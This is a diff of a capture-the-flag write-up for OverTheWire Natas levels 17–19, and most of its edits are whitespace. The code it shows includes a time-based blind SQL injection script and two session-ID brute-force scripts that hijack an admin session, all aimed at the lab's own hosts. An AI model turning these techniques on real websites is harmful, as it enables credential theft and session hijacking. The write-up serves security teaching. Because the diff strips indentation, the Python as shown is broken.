+ if time >= 9:
+ password += CHARS[j]
+ print("Password so far: " + password)
+ break
+ return password
 
 if __name__ == '__main__':
-        # authorization: login and password
-        AUTH = ('natas17', '****************************')
+ # authorization: login and password
+ AUTH = ('natas17', '****************************')
 
-        # BASE64 password and 32 bytes
-        CHARS = string.ascii_letters + string.digits
-        LENGTH = 32
+ # BASE64 password and 32 bytes
+ CHARS = string.ascii_letters + string.digits
+ LENGTH = 32
 
-        # crafted url
-        SQL_URL1 = 'http://natas17.natas.labs.overthewire.org?username=natas18" AND SUBSTRING(password,'
-        SQL_URL2 = ',1) LIKE BINARY "'
-        SQL_URL3 = '" AND SLEEP(10) AND "1"="1'
+ # crafted url
+ SQL_URL1 = 'http://natas17.natas.labs.overthewire.org?username=natas18" AND SUBSTRING(password,'
+ SQL_URL2 = ',1) LIKE BINARY "'
+ SQL_URL3 = '" AND SLEEP(10) AND "1"="1'
 
-        print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2))
+ print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2))
 ```
 
-Around 15 minutes later I got the password.
+Around 15 minutes later, I got the password.
 
 
 
@@ -1189,7 +1189,7 @@ Then we have a function that checks whether a variable *$id* is a number with th
 
 ```
 function isValidID($id) { /* {{{ */
-    return is_numeric($id);
+ return is_numeric($id);
 }
 ```
 
@@ -1198,17 +1198,17 @@ Then we have this main object:
 ```
 $showform = true;
 if(my_session_start()) {
-    print_credentials();
-    $showform = false;
+ print_credentials();
+ $showform = false;
 } else {
-    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
-    session_id(createID($_REQUEST["username"]));
-    session_start();
-    $_SESSION["admin"] = isValidAdminLogin();
-    debug("New session started");
-    $showform = false;
-    print_credentials();
-    }
+ if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+ session_id(createID($_REQUEST["username"]));
+ session_start();
+ $_SESSION["admin"] = isValidAdminLogin();
+ debug("New session started");
+ $showform = false;
+ print_credentials();
+ }
 }
 if($showform) {
 ?>
@@ -1216,8 +1216,8 @@ if($showform) {
 The next function create an random id number with the value defined by *$maxid*:
 ```php
 function createID($user) { /* {{{ */
-    global $maxid;
-    return rand(1, $maxid);
+ global $maxid;
+ return rand(1, $maxid);
 }
 ```
 
@@ -1225,20 +1225,20 @@ This checks whether the function *my_session_start()* is true:
 
 ```
 function my_session_start() { /* {{{ */
-    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
-    if(!session_start()) {
-        debug("Session start failed");
-        return false;
-    } else {
-        debug("Session start ok");
-        if(!array_key_exists("admin", $_SESSION)) {
-        debug("Session was old: admin flag set");
-        $_SESSION["admin"] = 0; // backwards compatible, secure
-        }
-        return true;
-    }
-    }
-    return false;
+ if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+ if(!session_start()) {
+ debug("Session start failed");
+ return false;
+ } else {
+ debug("Session start ok");
+ if(!array_key_exists("admin", $_SESSION)) {
+ debug("Session was old: admin flag set");
+ $_SESSION["admin"] = 0; // backwards compatible, secure
+ }
+ return true;
+ }
+ }
+ return false;
 }
 ```
 
@@ -1247,25 +1247,25 @@ In the case it's true, a function that prints the credentials is called, printin
 
 ```
 function print_credentials() { /* {{{ */
-    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
-    print "You are an admin. The credentials for the next level are:<br>";
-    print "<pre>Username: natas19\n";
-    print "Password: <censored></pre>";
-    } else {
-    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
-    }
+ if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+ print "You are an admin. The credentials for the next level are:<br>";
+ print "<pre>Username: natas19\n";
+ print "Password: <censored></pre>";
+ } else {
+ print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+ }
 }
 ```
 
-If *%my_session* is not true, it  will look to the HTTP request and search for username and password. If it finds them, it creates a session id:
+If *%my_session* is not true, it will look to the HTTP request and search for username and password. If it finds them, it creates a session id:
 
 ```
 function isValidAdminLogin() { /* {{{ */
-    if($_REQUEST["username"] == "admin") {
-    /* This method of authentication appears to be unsafe and has been disabled for now. */
-        //return 1;
-    }
-    return 0;
+ if($_REQUEST["username"] == "admin") {
+ /* This method of authentication appears to be unsafe and has been disabled for now. */
+ //return 1;
+ }
+ return 0;
 ```
 
 
@@ -1273,7 +1273,7 @@ function isValidAdminLogin() { /* {{{ */
 
 
 
-So, in summary, we have a function that starts the session, first checking if the session id is in the cookie and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word *admin* is in [SESSION_ID]. If not, it invalidates the session.
+So, in summary, we have a function that starts the session, first checking if the session id is in the cookie, and if this session id is a number. If true, it checks if it's a fresh session. Then, it checks if the word *admin* is in [SESSION_ID]. If not, it invalidates the session.
 
 [SESSION_ID]: http://en.wikipedia.org/wiki/Session_ID
 
@@ -1288,7 +1288,7 @@ The session ID is given by the variable *PHPSESSID*, and that's what we are goin
 
 
 
-The variable [$_REQUEST]  is an  array that by default contains the contents of *$_GET*, *$_POST* and *$_COOKIE*.
+The variable [$_REQUEST] is an array that by default contains the contents of *$_GET*, *$_POST* and *$_COOKIE*.
 
 [$_REQUEST]: http://php.net/manual/en/reserved.variables.request.php
 
@@ -1302,22 +1302,22 @@ We write the following script:
 import requests
 
 def brute_force_password(AUTH, URL, PAYLOAD, MAXID):
-    for i in range(MAXID):
-        HEADER ={'Cookie':'PHPSESSID=' + str(i)}
-        r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
-        if "You are an admin" in r.text:
-            print(r.text)
-            print(r.url)
-            print(str(i))
+ for i in range(MAXID):
+ HEADER ={'Cookie':'PHPSESSID=' + str(i)}
+ r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
+ if "You are an admin" in r.text:
+ print(r.text)
+ print(r.url)
+ print(str(i))
 
 if __name__ == '__main__':
-    AUTH = ('natas18', '*************************')
-    URL = 'http://natas18.natas.labs.overthewire.org/index.php?'
+ AUTH = ('natas18', '*************************')
+ URL = 'http://natas18.natas.labs.overthewire.org/index.php?'
 
-    PAYLOAD = ({'debug': '1', 'username': 'user', 'password': 'pass'})
-    MAXID = 640
+ PAYLOAD = ({'debug': '1', 'username': 'user', 'password': 'pass'})
+ MAXID = 640
 
-    brute_force_password(AUTH, URL, PAYLOAD, MAXID)
+ brute_force_password(AUTH, URL, PAYLOAD, MAXID)
 ```
 
 After a few minutes, we get our password.
@@ -1346,7 +1346,7 @@ After a few minutes, we get our password.
 
 This level looks exactly like the previous except that it has the following message:
 
-> This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+> This page uses mostly the same code as the previous level, but session IDs are no longer sequential ...
 
 ![cyber](http://i.imgur.com/OQ7LATt.png)
 
@@ -1412,23 +1412,23 @@ We write the following script:
 import requests
 
 def brute_force_password(AUTH, URL, PAYLOAD, MAXID):
-    for i in range(MAXID):
-        HEADER ={'Cookie':'PHPSESSID=' + (str(i) + '-admin').encode('hex')}
-        r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
-        print(i)
-        if "You are an admin" in r.text:
-            print(r.text)
-            print(r.url)
+ for i in range(MAXID):
+ HEADER ={'Cookie':'PHPSESSID=' + (str(i) + '-admin').encode('hex')}
+ r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
+ print(i)
+ if "You are an admin" in r.text:
+ print(r.text)
+ print(r.url)
 
 if __name__ == '__main__':
 
-    AUTH = ('natas19', '***********************')
-    URL = 'http://natas19.natas.labs.overthewire.org/index.php?'
+ AUTH = ('natas19', '***********************')
+ URL = 'http://natas19.natas.labs.overthewire.org/index.php?'
 
-    PAYLOAD = ({'debug': '1', 'username': 'admin', 'password': 'pass'})
-    MAXID = 640
+ PAYLOAD = ({'debug': '1', 'username': 'admin', 'password': 'pass'})
+ MAXID = 640
 
-    brute_force_password(AUTH, URL, PAYLOAD, MAXID)
+ brute_force_password(AUTH, URL, PAYLOAD, MAXID)
 ```
 
 And we get our password in the 501st attempt. Awesome.
@@ -1444,8 +1444,3 @@ Hack all the things!
 
 [source code is available]: https://github.com/bt3gl/CTFs-Gray-Hacker-and-PenTesting/tree/master/Web_Exploits
 
-
-
-----
-
-**Aloha, bt3**
